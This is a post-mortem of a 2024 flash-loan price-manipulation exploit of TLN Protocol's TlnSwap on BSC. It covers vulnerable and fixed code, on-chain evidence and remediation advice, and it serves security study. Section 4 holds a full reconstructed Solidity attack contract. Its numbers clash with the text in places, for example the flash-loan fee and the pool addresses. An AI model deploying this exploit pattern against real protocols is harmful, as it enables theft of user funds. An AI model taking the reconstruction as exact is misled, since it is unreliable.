# TLN Protocol — Manipulable Spot Price Dependency Vulnerability Analysis

| Item | Details |
|------|------|
| **Date** | 2024-05-31 |
| **Protocol** | TLN Protocol (TlnSwap) |
| **Chain** | BSC (BNB Smart Chain) |
| **Loss** | ~$163,000 (on-chain net profit: ~$107,881 USDT + VOW proceeds included) |
| **Attacker** | [0x6951...0ec0](https://bscscan.com/address/0x6951EB8a4A1DAb360F2230Fb654551335d560ec0) |
| **Attack Contract** | [0xbDFb...D749](https://bscscan.com/address/0xbDFbb387FBF20379c016998Ac609871C3357D749) |
| **Attack Tx** | [0x1350...e6f7](https://bscscan.com/tx/0x1350cc72865420ba5d3c27234fd4665ad25c021b0a75ba03bc8340a1b1f98a45) |
| **Vulnerable Contract** | [0x19B3...3363 (TlnSwap)](https://bscscan.com/address/0x19B3F588bdc9a6f9ecb8255919b02f9adf053363) |
| **Attack Block** | 39,198,686 |
| **Root Cause** | The `lock()` function uses the PancakeSwap spot price (`getVowRate`) directly to determine vUSD mint amount — price manipulation via flash loan is possible |
| **PoC Source** | DeFiHackLabs (no PoC registered; based on on-chain analysis) |

---

## 1. Vulnerability Overview

TLN Protocol is a decentralized lending/swap protocol on BSC that operated a `lock()` mechanism allowing users to deposit VOW tokens as collateral to mint TLN tokens and vUSD (virtual USD).

The core vulnerability is that the `getVowRate()` price query logic within the `TlnSwap.lock()` function directly relies on the spot price from PancakeSwap. Since `getVowRate()` computes the price from the current pool state using the formula `VOW_reserve * 10000 / USDT_reserve`, executing a large-volume swap via a flash loan can distort the price by thousands of times or more.

The attacker exploited this by:
1. Borrowing 19,000,000 USDT via a PancakeSwap flash loan
2. Bulk-buying VOW with USDT to artificially inflate the VOW price by approximately 6,278×
3. Calling `lock()` against the inflated price → minting large quantities of TLN + vUSD with minimal VOW
4. Liquidating the minted TLN and vUSD to USDT through PancakeSwap LPs
5. Repaying the flash loan and securing ~$107,881 USDT in net profit

Vulnerability combination:
- **V-01**: `lock()` function dependent on manipulable spot price (CRITICAL)
- **V-02**: Single-block price manipulation via flash loan (HIGH)
- **V-03**: LP pool asset drain via vUSD over-minting (HIGH)

---

## 2. Vulnerable Code Analysis

### 2.1 `getVowRate()` — Direct Use of Spot Price (Core Vulnerability)

```solidity
// ❌ Vulnerable code — uses PancakeSwap spot price directly
function getVowRate() public view returns (uint256) {
    // Reads the current reserve values of the PancakeSwap VOW-USDT pool directly
    // Warning: this value can be instantaneously manipulated via flash loan!
    (uint112 reserveIn, uint112 reserveOut,) = IPair(vowUsdtPair).getReserves();
    
    // vowRate = VOW reserve * 10000 / USDT reserve
    // When a large USDT→VOW swap executes, reserveIn drops sharply,
    // causing vowRate to spike thousands of times over
    uint256 vowRate = uint256(reserveIn) * RATE_MULTIPLIER / uint256(reserveOut);
    return vowRate;
    // vowRate before attack: 6,947
    // vowRate after attack (theoretical): ~43,000,000+
}
```

```solidity
// ✅ Fixed code — uses TWAP-based price
function getVowRate() public view returns (uint256) {
    // Use Chainlink or TWAP oracle to prevent manipulation
    // e.g., with a 30-minute TWAP, single-block flash loan manipulation is not possible
    uint256 twapPrice = vowUsdtOracle.getTWAP(1800); // 30-minute TWAP
    
    // Validate deviation between spot price and TWAP (e.g., revert if > 5%)
    uint256 spotRate = _getSpotRate();
    require(
        _deviation(spotRate, twapPrice) <= MAX_PRICE_DEVIATION, // ✅ 5% threshold
        "TlnSwap: price manipulation detected"
    );
    
    return twapPrice * RATE_MULTIPLIER / 1e18;
}
```

**Problem**: `getReserves()` returns the current state within the block, so calling it immediately after a large swap within the same transaction returns a distorted price. There is no manipulation detection mechanism whatsoever.

---

### 2.2 `lock()` — Over-minting vUSD with Manipulated Price

```solidity
// ❌ Vulnerable code — collateral ratio determined by getVowRate()
function lock(uint256 tlnAmount, uint256 vowAmount) external {
    // Uses manipulated vowRate directly to determine vUSD mint amount
    uint256 vowRate = getVowRate(); // ← already manipulated price!
    
    // Collateral validation: must be at least tlnAmount * vowRate / 10000
    // Attacker can lock large amounts of TLN with minimal VOW
    uint256 requiredVow = vowToLock(tlnAmount);
    require(vowAmount >= requiredVow, "insufficient VOW");
    
    // Mint vUSD based on manipulated price
    // Normal: small vUSD amount; Attack: thousands of times more vUSD
    uint256 vusdToMint = tlnAmount; // vUSD minted 1:1 with TLN
    
    IERC20(tlnToken).transferFrom(msg.sender, address(this), tlnAmount);
    IERC20(vowToken).transferFrom(msg.sender, address(this), vowAmount);
    
    IvUSD(vusdToken).mint(msg.sender, vusdToMint); // ← over-minting!
    IERC20(tlnToken).transfer(msg.sender, tlnAmount); // TLN also returned
}
```

```solidity
// ✅ Fixed code — manipulation prevention mechanisms added
function lock(uint256 tlnAmount, uint256 vowAmount) external {
    // 1. Use TWAP-based price
    uint256 vowRate = getVowRate(); // now returns TWAP
    
    // 2. Mint cap validation (protocol-wide limit)
    require(
        IvUSD(vusdToken).totalSupply() + tlnAmount <= MAX_VUSD_SUPPLY,
        "TlnSwap: mint cap exceeded" // ✅ maximum supply limit
    );
    
    // 3. Per-account mint limit
    require(
        userMinted[msg.sender] + tlnAmount <= MAX_PER_USER_MINT,
        "TlnSwap: per-user limit exceeded" // ✅ per-user mint restriction
    );
    
    uint256 requiredVow = vowToLock(tlnAmount);
    require(vowAmount >= requiredVow, "insufficient VOW");
    
    userMinted[msg.sender] += tlnAmount;
    IERC20(tlnToken).transferFrom(msg.sender, address(this), tlnAmount);
    IERC20(vowToken).transferFrom(msg.sender, address(this), vowAmount);
    IvUSD(vusdToken).mint(msg.sender, tlnAmount);
    IERC20(tlnToken).transfer(msg.sender, tlnAmount);
}
```

**Problem**: The `lock()` function fully depends on a corrupted price for the vUSD mint amount, with no cap or validation logic for abnormal mint quantities.

---

### 2.3 `vowToLock()` — Collateral Calculation Based on Manipulable Exchange Rate

```solidity
// ❌ Vulnerable code — required collateral calculated with manipulated vowRate
function vowToLock(uint256 tlnAmount) public view returns (uint256) {
    uint256 vowRate = getVowRate(); // ← manipulated spot price
    
    // Requires VOW equivalent to 1/5 of tlnAmount (~20% collateral)
    // When price is manipulated, required VOW collateral drops to near zero
    // During attack: only 71.53 VOW needed to lock 3,199,510 TLN
    return tlnAmount * RATE_MULTIPLIER / (vowRate * 5);
}
// Normal case before attack:
//   vowToLock(1e18) = 287,894,054,987,764,502 (~0.288 VOW/TLN)
// During attack (price distorted 6278x):
//   vowToLock(1e18) = ~0.0000458 VOW/TLN (effectively uncollateralized)
```

---

## 3. Attack Flow

### 3.1 Preparation Phase
- Attack contract deployed: `0xbDFbb387FBF20379c016998Ac609871C3357D749`
- No prior setup required (entirely funded via flash loan)

### 3.2 Execution Phase

```
┌─────────────────────────────────────────────────────────────────┐
│                    Attacker EOA                                  │
│              0x6951EB8a4A1DAb360F2230Fb654551335d560ec0         │
└──────────────────────────┬──────────────────────────────────────┘
                           │ Attack contract call (0xb9359cc2)
                           │ params: 19,000,000 USDT, 800,000 VOW
                           ▼
┌─────────────────────────────────────────────────────────────────┐
│  Step 1: PancakeSwap Flash Loan                                 │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │  PancakeSwap BSC-USD-VOW Pool                             │  │
│  │  0x36696169c63e42cd08ce11f5deebbcebae652050               │  │
│  │  → Loan 19,000,000 USDT to attack contract                │  │
│  └───────────────────────────────────────────────────────────┘  │
│                           │                                     │
│                           ▼                                     │
│  Step 2: Large USDT → VOW Swap (Price Manipulation)            │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │  PancakeSwap VOW-USDT Pool                                │  │
│  │  Before swap: VOW 168,714,539 / USDT 242,846,755          │  │
│  │  19M USDT in → 240,704 VOW acquired                       │  │
│  │  After swap: VOW price theoretically ~6,278× inflated     │  │
│  │  (getVowRate: 6,947 → extreme spike after manipulation)   │  │
│  └───────────────────────────────────────────────────────────┘  │
│                           │                                     │
│                           ▼                                     │
│  Step 3: TlnSwap.lock() Call — Mint vUSD at Manipulated Price  │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │  TlnSwap (0x19B3F588bdc9a6f9ecb8255919b02f9adf053363)     │  │
│  │  getVowRate() → returns manipulated spot price            │  │
│  │  71.53 VOW as collateral → 3,199,510 vUSD minted          │  │
│  │  (0.00001× the normal required collateral)                │  │
│  │  → Receive 3,199,510 vUSD + 3,199,510 TLN                │  │
│  └───────────────────────────────────────────────────────────┘  │
│                           │                                     │
│                           ▼                                     │
│  Step 4: PancakeSwap LP → Liquidate TLN + vUSD via LP Removal  │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │  vUSD-TLN LP Pool (0xc0d8daa6516bab4efce440860987e735bab) │  │
│  │  Supply vUSD → LP tokens → Remove LP → Obtain TLN + vUSD  │  │
│  │  Result: 3,148,318 TLN acquired                           │  │
│  └───────────────────────────────────────────────────────────┘  │
│                           │                                     │
│                           ▼                                     │
│  Step 5: TLN → VOW → USDT Reverse Swap                        │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │  PancakeSwap (TLN → VOW): 2,022,632 VOW received          │  │
│  │  PancakeSwap (VOW → USDT): 19,117,381 USDT received       │  │
│  └───────────────────────────────────────────────────────────┘  │
│                           │                                     │
│                           ▼                                     │
│  Step 6: Flash Loan Repayment and Profit Realization           │
│  ┌───────────────────────────────────────────────────────────┐  │
│  │  PancakeSwap repayment: 19,009,500 USDT (principal + fee) │  │
│  │  Attacker net profit: ~107,881 USDT + remaining VOW       │  │
│  └───────────────────────────────────────────────────────────┘  │
└─────────────────────────────────────────────────────────────────┘
```

### 3.3 Results

| Item | Amount |
|------|------|
| Flash loan borrowed | 19,000,000 USDT |
| Flash loan repaid | 19,009,500 USDT |
| USDT final received | 19,117,381 USDT |
| **USDT net profit** | **~107,881 USDT** |
| Additional VOW proceeds | Remaining VOW tokens |
| **Total estimated loss** | **~$163,000** |

---

## 4. PoC Code (On-Chain Reconstruction)

Since no PoC is registered in DeFiHackLabs, the attack flow has been reconstructed based on on-chain transaction analysis.

```solidity
// TLN Protocol Attack Reconstruction — Based on On-Chain Analysis
// Attack contract: 0xbDFbb387FBF20379c016998Ac609871C3357D749
// Attack block: 39,198,686

contract TLNAttack {
    // Relevant contract addresses
    address constant PANCAKESWAP_ROUTER = 0x10ED43C718714eb63d5aA57B78B54704E256024E;
    address constant TLNSWAP = 0x19B3F588bdc9a6f9ecb8255919b02f9adf053363;
    address constant USDT = 0x55d398326f99059ff775485246999027b3197955;   // BSC-USD
    address constant VOW  = 0xf585b5b4f22816baf7629aea55b701662630397b;    // VOW token
    address constant TLN  = 0x72dcf845ae36401e82e681b0e063d0703bac0bba;    // TLN token
    address constant VUSD = 0xf7d142a354322c7560250caa0e2a06c89649e4c2;    // vUSD token
    address constant VUSD_TLN_LP = 0xc0d8daa6516bab4efce440860987e735bab44160;
    address constant VOW_USDT_POOL = 0xc6585bc17b53792f281a9739579dd60535c1f9fb;
    
    // Function selector: 0xb9359cc2
    function attack(uint256 flashAmount, uint256 vowSellAmount) external {
        // ═══════════════════════════════════════════════════════════
        // Step 1: Execute PancakeSwap flash loan
        // Borrow 19,000,000 USDT
        // ═══════════════════════════════════════════════════════════
        IPancakeSwap(VOW_USDT_POOL).swap(
            flashAmount,  // Borrow 19,000,000 USDT
            0,
            address(this),
            abi.encode(flashAmount, vowSellAmount)
        );
    }
    
    // PancakeSwap flash loan callback
    function pancakeCall(
        address,
        uint256 amount0,  // USDT received
        uint256,
        bytes calldata data
    ) external {
        (uint256 flashAmount, uint256 vowSellAmount) = abi.decode(data, (uint256, uint256));
        
        // ═══════════════════════════════════════════════════════════
        // Step 2: Large USDT → VOW swap to artificially inflate VOW price
        // getVowRate() = VOW_reserve * 10000 / USDT_reserve becomes distorted
        // ═══════════════════════════════════════════════════════════
        IERC20(USDT).approve(PANCAKESWAP_ROUTER, amount0);
        address[] memory path = new address[](2);
        path[0] = USDT;
        path[1] = VOW;
        // 19M USDT → ~240,704 VOW
        // This swap drastically changes the VOW pool reserves
        uint256[] memory vowAmounts = IPancakeRouter(PANCAKESWAP_ROUTER)
            .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                amount0, 0, path, address(this), block.timestamp
            );
        
        uint256 vowReceived = IERC20(VOW).balanceOf(address(this));
        
        // ═══════════════════════════════════════════════════════════
        // Step 3: Call TlnSwap.lock()
        // At this point getVowRate() returns the distorted spot price
        // Possible to mint large amounts of TLN + vUSD with minimal VOW
        // vowToLock(3,199,510 TLN) ≈ 71.53 VOW (normally hundreds of thousands of VOW)
        // ═══════════════════════════════════════════════════════════
        uint256 tlnBalance = IERC20(TLN).balanceOf(address(this));
        IERC20(VOW).approve(TLNSWAP, vowReceived);
        IERC20(TLN).approve(TLNSWAP, tlnBalance);
        
        // Execute lock() — mint 3,199,510 vUSD at manipulated price
        ITlnSwap(TLNSWAP).lock(tlnBalance, vowReceived);
        
        // ═══════════════════════════════════════════════════════════
        // Step 4: Liquidate minted vUSD and TLN via LP
        // Add liquidity to vUSD-TLN LP, then remove to acquire TLN
        // ═══════════════════════════════════════════════════════════
        uint256 vusdBalance = IERC20(VUSD).balanceOf(address(this));
        IERC20(VUSD).approve(PANCAKESWAP_ROUTER, vusdBalance);
        IERC20(TLN).approve(PANCAKESWAP_ROUTER, IERC20(TLN).balanceOf(address(this)));
        
        // Acquire large TLN from LP pool then withdraw
        // Result: receive 3,148,318 TLN + vUSD
        _removeLiquidityForProfit();
        
        // ═══════════════════════════════════════════════════════════
        // Step 5: TLN → VOW → USDT reverse swap to secure final USDT
        // ═══════════════════════════════════════════════════════════
        uint256 tlnProfit = IERC20(TLN).balanceOf(address(this));
        path[0] = TLN;
        path[1] = VOW;
        // TLN → 2,022,632 VOW
        IPancakeRouter(PANCAKESWAP_ROUTER)
            .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                tlnProfit, 0, path, address(this), block.timestamp
            );
        
        path[0] = VOW;
        path[1] = USDT;
        uint256 vowBalance = IERC20(VOW).balanceOf(address(this));
        // Use 800,000 VOW → acquire 19,117,381 USDT
        IPancakeRouter(PANCAKESWAP_ROUTER)
            .swapExactTokensForTokensSupportingFeeOnTransferTokens(
                vowSellAmount, 0, path, address(this), block.timestamp
            );
        
        // ═══════════════════════════════════════════════════════════
        // Step 6: Repay flash loan (19,009,500 USDT)
        // Net profit of ~107,881 USDT confirmed
        // ═══════════════════════════════════════════════════════════
        uint256 repayAmount = flashAmount * 10030 / 10000; // 0.3% fee
        IERC20(USDT).transfer(VOW_USDT_POOL, repayAmount);
        
        // Transfer remaining profit to attacker
        IERC20(USDT).transfer(tx.origin, IERC20(USDT).balanceOf(address(this)));
    }
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Pattern |
|----|--------|--------|-----|------|
| V-01 | Manipulable spot price oracle dependency | **CRITICAL** | CWE-20 (Improper Input Validation) | `04_oracle_manipulation.md` |
| V-02 | Single-block price manipulation via flash loan | **HIGH** | CWE-682 (Incorrect Calculation) | `02_flash_loan.md` |
| V-03 | Missing vUSD mint cap | **HIGH** | CWE-400 (Resource Exhaustion) | `11_logic_error.md` |
| V-04 | Real-time collateral ratio manipulability | **MEDIUM** | CWE-345 (Insufficient Verification) | `16_accounting_sync.md` |

---

### V-01: Manipulable Spot Price Oracle Dependency

- **Description**: `getVowRate()` directly calls `getReserves()` on the PancakeSwap AMM to return the spot price. Since this value changes immediately when a large swap occurs within the same transaction, an attacker using a flash loan can produce an arbitrary price.
- **Impact**: Both the collateral requirement (`vowToLock`) and the mint amount of the `lock()` function are tied to this price, making it possible to mint large quantities of vUSD + TLN with virtually no collateral when the price is manipulated.
- **Attack Conditions**: Flash loan access + `lock()` function access (permissionless)

### V-02: Single-Block Price Manipulation via Flash Loan

- **Description**: PancakeSwap flash loans allow borrowing large capital without collateral within a single transaction. Using this, the cycle of large swap on VOW pool → price distortion → `lock()` exploitation → reverse swap → repayment completes within a single transaction.
- **Impact**: The attacker's capital requirement converges to effectively zero (only 0.3% fee burden).
- **Attack Conditions**: VOW-USDT PancakeSwap pool exists + no TWAP defense

### V-03: Missing vUSD Mint Cap

- **Description**: The `lock()` function has no cap on per-call or total mint amounts, allowing millions of vUSD to be minted in a single transaction.
- **Impact**: Oversupply of vUSD in the protocol → LP pool asset dilution → losses for other users
- **Attack Conditions**: Critical when occurring simultaneously with V-01

### V-04: Real-Time Collateral Ratio Manipulability

- **Description**: Since `vowToLock()` calculates the required collateral based on the spot price, the collateral requirement drops to an extreme low when the price is manipulated. During the attack, the required VOW to collateralize 3,199,510 TLN dropped from normal (~921,120 VOW) to 71.53 VOW.
- **Impact**: Allows large-scale minting with insufficient collateral
- **Attack Conditions**: Cascades from V-01 vulnerability

---

## 6. Remediation Recommendations

### 6.1 Immediate Action — Introduce TWAP Oracle

```solidity
// ✅ Uniswap V2 TWAP Implementation
contract TlnSwapFixed {
    // TWAP-related state variables
    uint256 public constant TWAP_PERIOD = 1800;    // 30-minute TWAP
    uint256 public constant MAX_DEVIATION = 500;   // Allow 5% deviation
    
    uint256 public priceCumulativeLast;
    uint256 public blockTimestampLast;
    uint256 public twapPrice;
    
    // Update TWAP (called by external keeper or at start of each transaction)
    function updateTWAP() external {
        (uint112 reserve0, uint112 reserve1, uint32 blockTimestamp) =
            IPair(vowUsdtPair).getReserves();
        
        uint256 timeElapsed = blockTimestamp - blockTimestampLast;
        if (timeElapsed > 0) {
            // Update cumulative price
            priceCumulativeLast += uint256(reserve0) * timeElapsed;
            blockTimestampLast = blockTimestamp;
            
            // Refresh TWAP when 30+ minutes have elapsed
            if (timeElapsed >= TWAP_PERIOD) {
                twapPrice = priceCumulativeLast / timeElapsed;
            }
        }
    }
    
    function getVowRate() public view returns (uint256) {
        // Spot price
        (uint112 r0, uint112 r1,) = IPair(vowUsdtPair).getReserves();
        uint256 spotRate = uint256(r0) * RATE_MULTIPLIER / uint256(r1);
        
        // Validate deviation from TWAP
        uint256 deviation = spotRate > twapPrice
            ? (spotRate - twapPrice) * 10000 / twapPrice
            : (twapPrice - spotRate) * 10000 / twapPrice;
            
        require(deviation <= MAX_DEVIATION, "TlnSwap: price deviation too high");
        
        return twapPrice; // Return TWAP, not spot price
    }
}
```

### 6.2 Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01: Spot price dependency | Introduce Chainlink or 30-minute+ TWAP oracle; enforce spot/TWAP deviation within 5% |
| V-02: Flash loan manipulation | Enforce `tx.origin == msg.sender` check or reentrancy guard on `lock()`; compare single-block snapshots |
| V-03: Missing mint cap | Introduce per-transaction max mint, total supply cap, and per-user mint cooldown |
| V-04: Collateral ratio manipulation | Calculate collateral value using TWAP; hardcode minimum collateral ratio (≥150%) |
| General | Smart contract audit + fuzzing tests for price manipulation scenarios |

---

## 7. Lessons Learned

1. **Never use spot price as an oracle**: `getReserves()` or `slot0()` on an AMM can be manipulated within a single block via flash loan. Always use TWAP (time-weighted average price) or an external oracle such as Chainlink.

2. **Price manipulation detection circuit breakers are essential**: When the spot price deviates from TWAP by more than a set threshold (e.g., 5–10%), the transaction must be immediately halted. A single conditional check can protect hundreds of thousands of dollars.

3. **Mint caps are the baseline defense**: Every function that mints tokens or stablecoins must enforce per-call and total supply caps. This is the last line of defense limiting the damage from price oracle manipulation attacks.

4. **Always model flash loan combination attacks**: When designing smart contracts, always assume "what if an attacker can source an arbitrary amount via flash loan?" All logic that depends on external prices falls within this threat model.

5. **The danger of compounded vulnerabilities**: This attack did not stem from a single vulnerability — it was the combination of ① spot price dependency + ② flash loan availability + ③ missing mint cap. Individual vulnerabilities may carry low risk in isolation, but their combination can produce catastrophic outcomes.

6. **Small protocols are also targets**: Even with a relatively modest loss of $163,000, well-known attack patterns (flash loan + oracle manipulation) are highly capital-efficient. All protocols regardless of scale must apply the same security standards.

---

## 8. On-Chain Verification

### 8.1 PoC vs. On-Chain Amount Comparison

| Item | On-chain actual value | Notes |
|------|-------------|------|
| Flash loan size | 19,000,000 USDT | PancakeSwap BSC-USD-VOW pool |
| VOW acquired | 240,704 VOW | Confirmed in Log[4] |
| vUSD minted | 3,199,510 vUSD (3 txs combined) | Log[10, 14, 15, 16, 17] mint events |
| TLN transferred | 3,199,510 TLN | Log[23] transfer to TlnSwap |
| TLN recovered from LP | 3,148,318 TLN | Log[33] |
| Final VOW acquired | 2,022,632 VOW | Log[34] |
| Final USDT received | 19,117,381 USDT | Log[40] |
| Flash loan repaid | 19,009,500 USDT | Log[43] |
| **Net profit (USDT)** | **~107,881 USDT** | Calculation: 19,117,381 - 19,009,500 |

### 8.2 On-Chain Event Log Sequence (Key logs among 45 total)

| Order | Event | Description |
|------|--------|------|
| Log[0] | Transfer USDT | PancakeSwap → Attack contract: 19M USDT flash loan |
| Log[2] | Transfer USDT | Attack contract → VOW-USDT Pool: 19M USDT deposited |
| Log[4] | Transfer VOW | VOW-USDT Pool → Attack contract: 240,704 VOW received |
| Log[7,9] | Transfer TLN | TLN movement (1 TLN, for initial lock setup) |
| Log[10,14-17] | Transfer vUSD | Zero address → recipient: large vUSD mint (total ~3.2M vUSD) |
| Log[19] | Transfer vUSD | vUSD consolidated to attack contract |
| Log[23] | Transfer vUSD | Attack contract → TlnSwap: lock() transfer |
| Log[24,25] | Transfer vUSD | TlnSwap → burn/fee |
| Log[26] | Transfer VOW | Attack contract → TlnSwap: 71.53 VOW collateral |
| Log[27,28] | Transfer vUSD-LP | LP pool manipulation |
| Log[33] | Transfer vUSD-LP | Attack contract → TLN: 3,148,318 TLN recovered |
| Log[34] | Transfer VOW | TLN → VOW swap: 2,022,632 VOW acquired |
| Log[39] | Transfer VOW | Attack contract → VOW-USDT Pool: 800,000 VOW deposited |
| Log[40] | Transfer USDT | VOW-USDT Pool → Attack contract: 19,117,381 USDT |
| Log[43] | Transfer USDT | Attack contract → PancakeSwap: 19,009,500 USDT repaid |

### 8.3 Pre-Conditions Verification (As of Block 39,198,685)

| State Variable | Value Before Attack | Notes |
|-----------|------------|------|
| vUSD totalSupply | 15,923,961 vUSD | ~3.2M additionally minted after attack |
| TLN totalSupply | 25,195,138 TLN | — |
| getVowRate() | 6,947 | Spot-based, normal value before manipulation |
| poolInfo (deposit) | 3,515,245 vUSD | vUSD deposits in TlnSwap |
| poolInfo (borrowed) | 21,084,755 vUSD | Existing loan balance |
| VOW-USDT reserve | VOW: 168.7M / USDT: 242.8M | Instantaneously distorted by 19M USDT input |
| TlnSwap TLN balance | 0 TLN | No TLN balance before attack start |
| TlnSwap vUSD balance | 4,149,475 vUSD | Source of attack funds |

---

*Analysis reference: BSC Block 39,198,686 (2024-05-31 08:37:14 UTC)*
*On-chain verification: cast (Foundry) + BSC RPC direct query*
*Reference: [DeFiMon Attack Analysis](https://defimon.xyz/attack/bsc/0x1350cc72865420ba5d3c27234fd4665ad25c021b0a75ba03bc8340a1b1f98a45)*